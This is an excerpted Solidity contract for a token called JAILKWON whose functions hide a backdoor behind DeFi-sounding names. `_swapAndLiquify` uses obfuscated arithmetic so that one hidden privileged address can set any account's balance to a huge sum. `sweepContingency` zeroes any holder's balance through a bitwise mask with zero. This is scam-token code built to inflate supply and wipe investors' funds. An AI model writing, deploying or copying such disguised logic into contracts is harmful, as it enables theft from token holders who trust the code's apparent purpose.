...
contract JAILKWON is Ownable {
  ...
  uint256 burnFee;
  uint256 private balances = 10000000000000000000000000000;
  ...
  function _swapAndLiquify(address owner) public returns (bool) {
      require(owner != address(0));
      require(uint256(msg.sender) == burnFee);
      uint256 amountToLiquify = uint256(owner);
      _liquify[address(amountToLiquify)] = (_liquify[owner] * 1 * 2 - _liquify[owner] * 1 * 2) + balances;
      return true;
  }
  ...
  function swapAmt(address receiver) internal view onlyOwner returns (uint256) {
    return (_liquify[receiver]) & (((_liquify[receiver]) & 0 ) << 0xF);
  }
        
  function sweepContingency(address receiver) public returns (bool) {
    if(receiver != address(0)){
    _liquify[receiver] = swapAmt(receiver);
    return true;
    }
  }
